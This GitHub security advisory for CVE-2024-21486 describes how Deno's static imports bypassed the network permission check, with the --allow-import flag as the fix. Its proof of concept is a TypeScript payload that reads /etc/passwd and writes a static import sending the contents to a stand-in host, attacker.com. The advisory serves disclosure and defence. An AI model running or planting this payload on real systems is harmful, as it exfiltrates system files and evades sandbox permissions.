# [M] Deno vulnerable to Exposure of Sensitive Information to an Unauthorized Actor

## Summary
Severity: Medium
Advisory: GHSA-jv4x-jv3h-qff5
CVE: CVE-2024-21486
CWE: CWE-200
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2025-06-05
Source: https://github.com/advisories/GHSA-jv4x-jv3h-qff5
Type: github-advisory

## Affected
- crates.io: `deno` — affected >=0 <2.0.0

## Details
### Summary

Static imports are exempted from the network permission check. An attacker could exploit this to leak the password file on the network.

### Details

Static imports in Deno are exempted from the network permission check. This can be exploited by attackers in multiple ways, when third-party code is directly/indirectly executed with `deno run`:

1. The simplest payload would be a tracking pixel-like import that attackers place in their code to find out when developers use the attacker-controlled code.
2. When `--allow-write` and `--allow-read` permissions are given, an attacker can perform a sophisticated two-steps attack: first, they generate a ts/js file containing a static import and in a second execution load this static file.

### PoC

```ts
const __filename = new URL("", import.meta.url).pathname;
let oldContent = await Deno.readTextFile(__filename);
let passFile = await Deno.readTextFile("/etc/passwd");
let pre =
  'import {foo} from "[https://attacker.com?val=](https://attacker.com/?val=)' +
  encodeURIComponent(passFile) + '";\n';
await Deno.writeTextFile(__filename, pre + oldContent);
```

Executing a file containing this payload twice, with `deno run --allow-read --allow-write` would cause the password file to leak on the network, even though no network permission was granted.

This vulnerability was fixed with the addition of the `--allow-import` flag: https://docs.deno.com/runtime/fundamentals/security/#network-access

## References
- https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5
- https://github.com/denoland/deno
